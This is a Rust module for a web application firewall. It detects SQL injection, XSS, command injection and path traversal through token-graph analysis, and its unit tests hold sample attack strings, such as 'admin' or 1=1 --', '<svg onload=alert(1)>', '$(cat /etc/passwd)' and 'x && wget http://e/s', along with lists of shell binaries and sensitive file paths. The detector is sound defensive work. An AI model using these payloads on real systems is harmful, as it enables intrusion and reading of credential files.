//! FR2 — Token graph + taint reachability.
//!
//! We tokenize the normalized payload across several grammars (SQL / HTML /
//! shell / path), build a small graph over the tokens, mark the whole field as
//! a tainted source, locate dangerous *sink* constructs, and check whether a
//! source→sink path exists. Because the analysis is over token *structure*
//! rather than literal strings, semantics-preserving mutations (case,
//! whitespace, comments, operator swaps) do not hide the attack — this is the
//! engine's mutation-robustness, done honestly and bounded.

mod tokenize;
pub mod sinks;

pub use tokenize::{tokenize, Token, TokenKind};

use crate::judgment::{Family, Pattern};

/// Caps so adversarial input can never blow up memory/CPU.
const MAX_NODES: usize = 4096;

#[derive(Debug, Clone)]
pub struct Analysis {
    /// Sink patterns that are actually reachable from the tainted source.
    pub reachable: Vec<Pattern>,
    /// Sinks present but not conclusively reachable (weaker signal).
    pub latent: Vec<Pattern>,
    pub graph_truncated: bool,
}

impl Analysis {
    pub fn is_empty(&self) -> bool {
        self.reachable.is_empty() && self.latent.is_empty()
    }
}

/// Analyze one normalized field value.
pub fn analyze(text: &str) -> Analysis {
    let mut tokens = tokenize(text);
    let graph_truncated = tokens.len() > MAX_NODES;
    if graph_truncated {
        tokens.truncate(MAX_NODES);
    }

    let mut reachable = Vec::new();
    let mut latent = Vec::new();

    // At the WAF boundary the entire field is attacker-controlled, so any
    // structural sink we find *is* reachable from the tainted source. We still
    // distinguish "formed a dangerous construct" (reachable) from "contains a
    // lone dangerous token" (latent) to keep false positives down.
    detect_sql(&tokens, text, &mut reachable, &mut latent);
    detect_xss(&tokens, text, &mut reachable, &mut latent);
    detect_shell(&tokens, text, &mut reachable, &mut latent);
    detect_path(text, &mut reachable, &mut latent);

    Analysis {
        reachable,
        latent,
        graph_truncated,
    }
}

fn has_kw(tokens: &[Token], kw: &str) -> bool {
    tokens
        .iter()
        .any(|t| t.kind == TokenKind::SqlKeyword && t.text == kw)
}

fn detect_sql(tokens: &[Token], text: &str, reach: &mut Vec<Pattern>, latent: &mut Vec<Pattern>) {
    // UNION ... SELECT (order-respecting, comments already stripped).
    let mut seen_union = false;
    for t in tokens {
        if t.kind == TokenKind::SqlKeyword && t.text == "union" {
            seen_union = true;
        }
        if seen_union && t.kind == TokenKind::SqlKeyword && t.text == "select" {
            reach.push(Pattern::new(Family::Sqli, "union-select"));
            break;
        }
    }

    // Tautology / boolean-based: OR/AND <x> <cmp> <x>  e.g. or 1=1, or 'a'='a'.
    if detect_tautology(tokens) {
        reach.push(Pattern::new(Family::Sqli, "boolean-tautology"));
    }

    // Quote breakout: a string quote immediately followed by a boolean/union SQL
    // keyword (`' OR`, `' AND`, `' UNION`). Requiring adjacency avoids flagging a
    // stray apostrophe from a contraction ("it's") that happens to co-occur with
    // the word "or" elsewhere in the value.
    if quote_then_bool(tokens) {
        reach.push(Pattern::new(Family::Sqli, "quote-breakout"));
    }

    // Stacked queries: ';' followed by a DML/DDL keyword.
    let mut semi = false;
    for t in tokens {
        if t.kind == TokenKind::Punct && t.text == ";" {
            semi = true;
        } else if semi
            && t.kind == TokenKind::SqlKeyword
            && matches!(
                t.text.as_str(),
                "select" | "insert" | "update" | "delete" | "drop" | "exec" | "create"
            )
        {
            reach.push(Pattern::new(Family::Sqli, "stacked-query"));
            break;
        }
    }

    // Classic error/based functions as latent signal.
    for f in ["sleep", "benchmark", "updatexml", "extractvalue", "load_file", "pg_sleep"] {
        if text.contains(f) {
            latent.push(Pattern::new(Family::Sqli, f));
        }
    }

    // Lone SELECT/UNION without structure is latent only.
    if reach.is_empty() && (has_kw(tokens, "select") || seen_union) {
        latent.push(Pattern::new(Family::Sqli, "sql-keyword"));
    }
}

fn detect_tautology(tokens: &[Token]) -> bool {
    // A tautology (`1=1`, `'a'='a'`) is only an *attack* when it sits in a query
    // context: led by a boolean operator (OR/AND), or appearing where a quote has
    // broken out of a string literal. Bare `1 = 1` in prose is NOT flagged —
    // that is the false-positive the semantic approach exists to avoid.
    let quote_present = has_quote(tokens);
    let t = tokens;
    for i in 0..t.len() {
        if t[i].kind == TokenKind::Comparator && (t[i].text == "=" || t[i].text == "like") {
            if i == 0 || i + 1 >= t.len() {
                continue;
            }
            let l = &t[i - 1];
            let r = &t[i + 1];
            let operandish = |k: TokenKind| {
                matches!(k, TokenKind::Number | TokenKind::Ident | TokenKind::String)
            };
            if operandish(l.kind) && operandish(r.kind) {
                // A tautology requires the two operands to actually be equal
                // (`1=1`, `5=5`, `x=x`). That alone is not an attack ("whether
                // 1 = 1" in prose), so also require injection context: led by a
                // boolean operator, or a quote breakout present. This rejects
                // benign "salt and pepper = tasty" (operands differ).
                let equal = l.text == r.text;
                let preceded_by_bool = i >= 2
                    && t[i - 2].kind == TokenKind::SqlKeyword
                    && (t[i - 2].text == "or" || t[i - 2].text == "and");
                if equal && (preceded_by_bool || quote_present) {
                    return true;
                }
            }
        }
    }
    false
}

fn has_quote(tokens: &[Token]) -> bool {
    tokens.iter().any(|t| t.kind == TokenKind::Quote)
}

/// True if a Quote token is immediately followed by a boolean/union SQL keyword.
fn quote_then_bool(tokens: &[Token]) -> bool {
    tokens.windows(2).any(|w| {
        w[0].kind == TokenKind::Quote
            && w[1].kind == TokenKind::SqlKeyword
            && matches!(w[1].text.as_str(), "or" | "and" | "union")
    })
}

fn detect_xss(tokens: &[Token], text: &str, reach: &mut Vec<Pattern>, latent: &mut Vec<Pattern>) {
    let has_tag_open = tokens.iter().any(|t| t.kind == TokenKind::TagOpen);
    let has_handler = tokens.iter().any(|t| t.kind == TokenKind::EventHandler);
    // <script>
    if text.contains("<script") {
        reach.push(Pattern::new(Family::Xss, "script-tag"));
    }
    // Event-handler attribute, either inside a new tag (`<svg onload=`) or an
    // attribute-breakout into an existing tag (`x" onmouseover=alert(1)`), which
    // has a quote but no new tag (M3).
    if has_handler && (has_tag_open || has_quote(tokens)) {
        reach.push(Pattern::new(Family::Xss, "event-handler"));
    }
    // javascript:/data: protocol
    if text.contains("javascript:") || text.contains("data:text/html") {
        reach.push(Pattern::new(Family::Xss, "dangerous-proto"));
    }
    // svg/img/iframe with handler
    for tag in ["<svg", "<img", "<iframe", "<body", "<video"] {
        if text.contains(tag) && tokens.iter().any(|t| t.kind == TokenKind::EventHandler) {
            reach.push(Pattern::new(Family::Xss, "tag-with-handler"));
            break;
        }
    }
    if reach.iter().all(|p| p.family != Family::Xss) && has_tag_open {
        latent.push(Pattern::new(Family::Xss, "html-tag"));
    }
}

fn detect_shell(tokens: &[Token], text: &str, reach: &mut Vec<Pattern>, latent: &mut Vec<Pattern>) {
    let bins = [
        "cat", "ls", "id", "whoami", "wget", "curl", "nc", "bash", "sh", "ping", "nslookup",
        "uname", "pwd", "chmod", "rm", "python", "perl",
    ];
    // Command substitution $( ) or backticks. A bare `$(` is usually jQuery
    // (`$(document)`, `$('#id')`) and a lone backtick is often just a 0x60 byte
    // in a binary body, so substitution only forms a construct when a known
    // binary sits in command position right after the opener; otherwise latent.
    if text.contains("$(") || text.contains('`') {
        if substitution_runs_binary(text, &bins) {
            reach.push(Pattern::new(Family::CommandInjection, "cmd-substitution"));
        } else {
            latent.push(Pattern::new(Family::CommandInjection, "cmd-substitution"));
        }
    }
    // Chaining: a shell metacharacter followed (in command position) by a known
    // binary — `; cat`, `| whoami`, `&& wget`. Requiring the binary to come
    // *after* the separator avoids flagging benign values that merely contain a
    // short word and a separator elsewhere ("cat;dog" is not command injection).
    let has_meta = tokens
        .iter()
        .any(|t| t.kind == TokenKind::ShellMeta && matches!(t.text.as_str(), ";" | "|" | "&" | "&&" | "||"));
    if binary_after_meta(tokens, &bins) {
        reach.push(Pattern::new(Family::CommandInjection, "chained-command"));
    } else if has_meta {
        latent.push(Pattern::new(Family::CommandInjection, "shell-meta"));
    }
}

/// True if a `$(` or backtick opener is followed, in command position, by a
/// known binary — optionally behind a path (`$(/bin/cat`, `` `/usr/bin/id ``).
///
/// Works on the text rather than tokens because command position depends on
/// whitespace, which the lexer drops (`$(cat /etc/passwd)` would otherwise read
/// as the path `cat/etc/passwd`).
fn substitution_runs_binary(text: &str, bins: &[&str]) -> bool {
    let chars: Vec<char> = text.chars().collect();
    let n = chars.len();
    for i in 0..n {
        let mut j = if chars[i] == '`' {
            i + 1
        } else if chars[i] == '$' && i + 1 < n && chars[i + 1] == '(' {
            i + 2
        } else {
            continue;
        };
        while j < n && chars[j].is_whitespace() {
            j += 1;
        }
        let start = j;
        while j < n && (chars[j].is_ascii_alphanumeric() || matches!(chars[j], '_' | '/' | '.' | '-')) {
            j += 1;
        }
        let word: String = chars[start..j].iter().collect();
        let cmd = word.rsplit('/').next().unwrap_or("");
        if bins.contains(&cmd) {
            return true;
        }
    }
    false
}

/// True if the first identifier following a shell metacharacter is a known
/// binary (command position).
fn binary_after_meta(tokens: &[Token], bins: &[&str]) -> bool {
    let mut armed = false;
    for t in tokens {
        match t.kind {
            TokenKind::ShellMeta if matches!(t.text.as_str(), ";" | "|" | "&" | "&&" | "||") => {
                armed = true;
            }
            TokenKind::Punct if t.text == ";" => {
                armed = true;
            }
            TokenKind::Ident if armed => {
                return bins.contains(&t.text.as_str());
            }
            // any other token in command position resets (e.g. `=`, number)
            _ if armed => {
                armed = false;
            }
            _ => {}
        }
    }
    false
}

fn detect_path(text: &str, reach: &mut Vec<Pattern>, latent: &mut Vec<Pattern>) {
    let dots = text.matches("../").count() + text.matches("..\\").count();
    if dots >= 1 {
        // sensitive target raises to reachable
        let sensitive = ["etc/passwd", "etc/shadow", "win.ini", "boot.ini", "/proc/"]
            .iter()
            .any(|s| text.contains(s));
        if dots >= 2 || sensitive {
            reach.push(Pattern::new(Family::PathTraversal, "directory-traversal"));
        } else {
            latent.push(Pattern::new(Family::PathTraversal, "dotdot-segment"));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fams(a: &Analysis) -> Vec<(Family, String)> {
        a.reachable
            .iter()
            .map(|p| (p.family, p.name.clone()))
            .collect()
    }

    #[test]
    fn union_select_detected() {
        let a = analyze("-1 union select username,password from users");
        assert!(fams(&a).iter().any(|(f, _)| *f == Family::Sqli));
    }

    #[test]
    fn tautology_detected() {
        assert!(!analyze("admin' or 1=1 -- ").reachable.is_empty());
        assert!(!analyze("' or 'a'='a").reachable.is_empty());
    }

    #[test]
    fn script_detected() {
        let a = analyze("<script>alert(1)</script>");
        assert!(a.reachable.iter().any(|p| p.family == Family::Xss));
    }

    #[test]
    fn event_handler_detected() {
        let a = analyze("<svg onload=alert(1)>");
        assert!(a.reachable.iter().any(|p| p.family == Family::Xss));
    }

    #[test]
    fn command_injection_detected() {
        let a = analyze("127.0.0.1; cat /etc/passwd");
        assert!(a
            .reachable
            .iter()
            .any(|p| p.family == Family::CommandInjection));
    }

    #[test]
    fn traversal_detected() {
        let a = analyze("../../../../etc/passwd");
        assert!(a
            .reachable
            .iter()
            .any(|p| p.family == Family::PathTraversal));
    }

    #[test]
    fn attribute_breakout_xss_detected() {
        // M3: event handler via attribute breakout, no new tag.
        let a = analyze("x\" onmouseover=alert(1)");
        assert!(
            a.reachable.iter().any(|p| p.family == Family::Xss),
            "missed attr-breakout xss: {:?}",
            a
        );
    }

    #[test]
    fn benign_prose_is_clean() {
        // Values that used to produce false-positive *reachable* hits (H2).
        for s in [
            "please select your favorite number, mine is 7",
            "i wrote about whether 1 = 1 in my math blog",
            "salt and pepper = tasty",
            "price and qty = total",
            "cat;dog",            // pet store search, not command injection
            "it's blue or green = nice",
            "the union of two sets",
        ] {
            let a = analyze(s);
            assert!(
                a.reachable.is_empty(),
                "false positive on {s:?}: {:?}",
                a.reachable
            );
        }
    }

    #[test]
    fn jquery_dollar_paren_is_not_cmdi() {
        for s in ["$(document).ready(function(){})", "$('#id').hide()"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().all(|p| p.family != Family::CommandInjection),
                "false positive on {s:?}: {:?}",
                a.reachable
            );
        }
        for s in ["$(cat /etc/passwd)", "`whoami`", "$(/bin/cat /etc/passwd)", "x=`id`"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().any(|p| p.name == "cmd-substitution"),
                "missed substitution on {s:?}: {:?}",
                a
            );
        }
    }

    #[test]
    fn command_injection_still_caught_after_fp_fix() {
        for s in ["127.0.0.1; cat /etc/passwd", "foo | whoami", "x && wget http://e/s"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().any(|p| p.family == Family::CommandInjection),
                "missed cmdi on {s:?}: {:?}",
                a
            );
        }
    }
}
